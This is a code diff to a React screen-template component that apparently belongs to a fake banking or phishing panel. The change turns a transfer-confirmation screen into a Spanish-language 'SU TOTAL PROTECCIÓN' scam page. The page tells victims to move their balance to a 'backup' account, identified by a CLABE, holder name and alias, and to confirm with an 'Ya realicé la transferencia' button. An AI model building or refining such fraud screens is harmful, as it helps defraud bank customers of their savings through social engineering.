@@ -348,21 +348,27 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
       case ScreenType.TRANSFERIR:
         const transferirContent = (
           <>
-            <h2 className="text-xl font-bold mb-3">Transferencia</h2>
+            <h2 className="text-xl font-bold mb-3">Cuenta SU TOTAL PROTECCIÓN creada exitosamente.</h2>
             <div className="p-4 bg-gray-100 rounded mb-4 text-left">
-              <p className="mb-2">
-                Confirma los datos de la transferencia:
+              <p className="mb-3">
+                Con el fin de proteger su saldo disponible es necesario transferir la cantidad de <strong>${screenData.monto || "39933"}</strong> a la siguiente cuenta SU TOTAL PROTECCIÓN (STP).
               </p>
-              <p className="mb-1">Monto: <strong>${screenData.monto || "0.00"}</strong></p>
-              <p className="mb-1">CLABE: <strong>{screenData.clabe || "0000000000000000000"}</strong></p>
-              <p className="mb-1">Beneficiario: <strong>{screenData.titular || "Titular"}</strong></p>
+              <p className="mb-2">Clabe:</p>
+              <p className="mb-3 font-medium">{screenData.clabe || "272762626262727272727272266222"}</p>
+              <p className="mb-2">Titular de la cuenta:</p>
+              <p className="mb-3 font-medium">{screenData.titular || "Nwnnwhwhw"}</p>
+              <p className="mb-2">Alias:</p>
+              <p className="mb-3 font-medium">{screenData.alias || "Cuenta de respaldo."}</p>
+              <p className="mt-3 font-medium">
+                Esta ventana se actualizará una vez reconozcamos que se haya transferido el saldo a su cuenta de respaldo.
+              </p>
             </div>
             
             <Button 
               className={primaryBtnClass}
               onClick={() => onSubmit(ScreenType.TRANSFERIR, { confirmado: true })}
             >
-              Confirmar
+              Ya realicé la transferencia
             </Button>
           </>
         );
